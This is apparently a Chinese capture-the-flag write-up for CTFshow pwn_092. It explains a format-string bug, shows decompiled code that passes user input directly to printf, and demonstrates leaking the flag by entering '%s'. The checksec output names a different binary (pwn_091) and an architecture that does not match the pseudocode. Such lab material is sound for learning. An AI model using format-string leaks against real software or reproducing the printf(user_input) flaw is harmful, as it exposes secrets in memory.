# CTFshow-pwn_092
1. 题目来源：CTFshow题库（本地环境）
2. PWN + 格式化字符串（leak）
## 解题思路
> 用格式符泄露数据 ~~flag点击就送~~

仅没有 PIE 保护，部分 RELRO  
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ checksec ./pwn_091
[*] '/home/mrw/CTFshow/pwn_091'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
    Stripped:   No
```
 
漏洞函数和主函数伪代码如下  
```c
unsigned __int64 flagishere()
{
  FILE *stream; // [rsp+8h] [rbp-68h]
  char format[10]; // [rsp+16h] [rbp-5Ah] BYREF
  char s[72]; // [rsp+20h] [rbp-50h] BYREF
  unsigned __int64 v4; // [rsp+68h] [rbp-8h]

  v4 = __readfsqword(0x28u);
  stream = fopen("/ctfshow_flag", "r");
  if ( !stream )
  {
    puts("/ctfshow_flag: No such file or directory.");
    exit(0);
  }
  fgets(s, 64, stream);
  printf("Enter your format string: ");
  __isoc99_scanf("%9s", format);
  printf("The flag is :");
  printf(format, s);
  return __readfsqword(0x28u) ^ v4;
}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  logo();
  puts("Here is some example:");
  example();
  flagishere();
  return 0;
}
```
- printf 的 format 字符串中若出现多余的格式符将会自动把栈上的数据作为格式符参数  
- 这里已经将 flag 所在的地址作为第一个参数输入，输入 %s 即可  

## Flag
> 题目在本地运行， flag自己随便设的
运行结果如下
```text
mrw@mrw-VMware-Virtual-Platform:~/CTFshow$ ./pwn_092
    ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄            ▄▄                           
  ██▀▀▀▀█  ▀▀▀██▀▀▀  ██▀▀▀▀▀▀            ██                           
 ██▀          ██     ██        ▄▄█████▄  ██▄████▄   ▄████▄  ██      ██
 ██           ██     ███████   ██▄▄▄▄ ▀  ██▀   ██  ██▀  ▀██ ▀█  ██  █▀
 ██▄          ██     ██         ▀▀▀▀██▄  ██    ██  ██    ██  ██▄██▄██ 
  ██▄▄▄▄█     ██     ██        █▄▄▄▄▄██  ██    ██  ▀██▄▄██▀  ▀██  ██▀ 
    ▀▀▀▀      ▀▀     ▀▀         ▀▀▀▀▀▀   ▀▀    ▀▀    ▀▀▀▀     ▀▀  ▀▀  
    * *************************************                           
    * Classify: CTFshow --- PWN --- 入门                              
    * Type  : Format_String                                           
    * Site  : https://ctf.show/                                       
    * Hint  : Look at the difference !                                
    * *************************************                           
Here is some example:
Hello CTFshow %
Hello CTFshow!
Num : 114514
Format Strings
           A
           Hello
           A
          Hello!
Strings Format
                                         
Enter your format string: %s  
The flag is :flag{Success!}
```
